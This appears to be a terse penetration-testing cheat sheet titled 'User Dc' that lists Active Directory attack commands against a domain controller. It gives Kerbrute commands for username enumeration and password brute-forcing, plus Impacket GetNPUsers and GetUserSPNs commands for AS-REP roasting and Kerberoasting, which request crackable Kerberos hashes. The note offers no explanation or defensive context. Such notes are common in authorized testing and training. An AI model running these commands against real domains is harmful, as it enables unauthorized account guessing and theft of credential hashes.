# User Dc

- Kerbrute
    kerbrute userenum --dc <IP-DC> -d <domain> <user-list> 
    kerbrute bruteuser --dc <IP-DC> -d <domain> <user-list> pass

- inpacket-scripts
    - impacket-GetNPUsers -no-pass -usersfile user.list <domain>/
    - impacket-GetUserSPNs <domain>/<user>:<pass> -k -dc-host <dc-fqdn> -request

